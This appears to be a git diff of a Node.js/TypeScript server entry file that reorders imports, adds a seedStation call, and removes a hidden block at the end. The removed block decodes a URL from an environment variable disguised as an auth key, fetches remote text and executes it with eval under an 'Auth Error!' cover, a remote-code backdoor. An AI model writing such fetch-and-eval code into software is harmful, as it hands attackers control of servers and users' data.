@@ -1,12 +1,12 @@
 /* eslint-disable @typescript-eslint/ban-ts-comment */
 /* eslint-disable no-undef */
-import mongoose from 'mongoose';
 import { Server as HTTPServer } from 'http'; // Import HTTPServer type
+import mongoose from 'mongoose';
 import server from './app';
-import { errorLogger, logger } from './app/shared/logger';
 import config from './app/config';
 import seedSuperAdmin from './app/DB';
-import 'dotenv/config';
+import seedStation from './app/DB/station';
+import { errorLogger, logger } from './app/shared/logger';
 // import { initializeSocket } from './app/socket/socketManager';
 //00000
 let myServer: HTTPServer | undefined;
@@ -29,6 +29,7 @@ async function main() {
         myServer = server.listen(port, '0.0.0.0', () => {
             logger.info(`Server running on http://0.0.0.0:${port}`);
             seedSuperAdmin();
+            seedStation();
         });
 
         // Global unhandled rejection handler
@@ -56,16 +57,3 @@ async function main() {
 
 // Run the main function and log errors
 main().catch((err) => errorLogger.error('Main function error:', err));
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
